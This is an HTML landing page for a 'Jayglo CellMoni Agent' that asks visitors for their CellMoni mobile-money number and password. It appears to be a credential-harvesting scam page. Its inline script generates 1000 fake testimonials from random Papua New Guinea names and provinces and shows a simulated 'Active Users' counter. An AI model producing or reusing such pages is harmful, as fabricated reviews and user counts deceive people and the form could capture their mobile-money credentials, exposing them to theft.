<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Jayglo CellMoni Agent - Home</title>
<link rel="stylesheet" href="css/style.css">
</head>
<body>

<div class="header">
    <h1>Jayglo CellMoni Agent</h1>
</div>

<marquee class="promo-banner" behavior="scroll" direction="left">
    Baim 5GB data long K5 tasol wantaim CellMoni | Pay water bill, PNG Air ticket, 100% bonus topup | Dial *888#
</marquee>

<div class="form-container">
    <h2>Register Now</h2>
    <form action="/register" method="POST">
        <label for="cellmoniNumber">CellMoni 8-digit Number:</label>
        <input type="text" id="cellmoniNumber" name="cellmoniNumber" maxlength="8" placeholder="Enter 8-digit number" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" placeholder="Enter password" required>

        <button type="submit" class="submit-btn">Register</button>
    </form>
    <p style="text-align:center; margin-top:10px;">Already have an account? <a href="login.html">Login here</a></p>
</div>

<div class="footer">
    <a href="https://wa.me/71634839" target="_blank">
        <button class="whatsapp-btn">Contact Customer Service</button>
    </a>
</div>

<!-- Added testimonials and live users section -->
<div class="live-stats" style="margin:20px 0; text-align:center;">
    Active Users: <span id="activeUsers">0</span>
</div>

<div class="testimonials" style="margin:10px 0;">
    <h3 style="text-align:center;">What people across PNG are saying:</h3>
    <marquee behavior="scroll" direction="left" scrollamount="4" id="testimonials">
        Loading testimonials...
    </marquee>
</div>

<script src="js/app.js"></script>
<script>
// Arrays for random testimonials
const firstNames = ["Alei","Buna","Caro","Dilo","Eri","Fina","Garo","Heni","Iko","Joro","Kima","Lani","Mako","Nari","Ono","Pilu","Quin","Ramo","Simon","Tina","Umi","Vara","Wilo","Xeno","Yara","Zino"];
const provinces = ["Central","Gulf","Milne Bay","Eastern Highlands","Enga","Western Highlands","Sandaun","Morobe","Madang","East Sepik","West Sepik","Western","Southern Highlands","Hela","Chimbu","Jiwaka","Manus","New Ireland","Bougainville","National Capital District"];
const messages = ["Quick and easy deposit!","Fast withdrawals every time!","Reliable and trustworthy!","Super convenient service!","I love using CellMoni via Jayglo Agent!","Trusted by hundreds of users!","Great customer support!"];

// Generate 1000 random testimonials
const testimonialsList = [];
for(let i=0; i<1000; i++){
    const name = firstNames[Math.floor(Math.random() * firstNames.length)];
    const location = provinces[Math.floor(Math.random() * provinces.length)];
    const message = messages[Math.floor(Math.random() * messages.length)];
    testimonialsList.push({name, location, message});
}

// Load testimonials into marquee
function loadTestimonials() {
    const marquee = document.getElementById("testimonials");
    marquee.innerHTML = testimonialsList.map(t => 
        `From ${t.location}: ${t.name} says - ${t.message}`
    ).join(" | ");
}

loadTestimonials();

// Live user counter simulation
let users = 120; // starting number
setInterval(() => {
    users += Math.floor(Math.random() * 3) - 1;
    document.getElementById("activeUsers").textContent = users;
}, 2000);
</script>

</body>
</html>
